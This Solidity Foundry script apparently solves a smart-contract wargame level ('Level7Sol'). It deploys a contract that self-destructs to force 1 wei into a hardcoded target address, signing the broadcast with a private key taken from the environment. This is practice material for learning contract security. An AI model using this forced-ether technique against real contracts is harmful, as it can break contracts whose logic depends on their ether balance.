// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

contract ToBeDestructed{
    constructor(address payable _forceAddress) payable{
        selfdestruct(_forceAddress);
    }
}

contract Level7Sol is Script{
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new ToBeDestructed{value: 1 wei}(payable(0x562488c3a3f2208737b860fF335cfBc3CD306865));//address of the contract with Get New Instance
        vm.stopBroadcast();
    }
}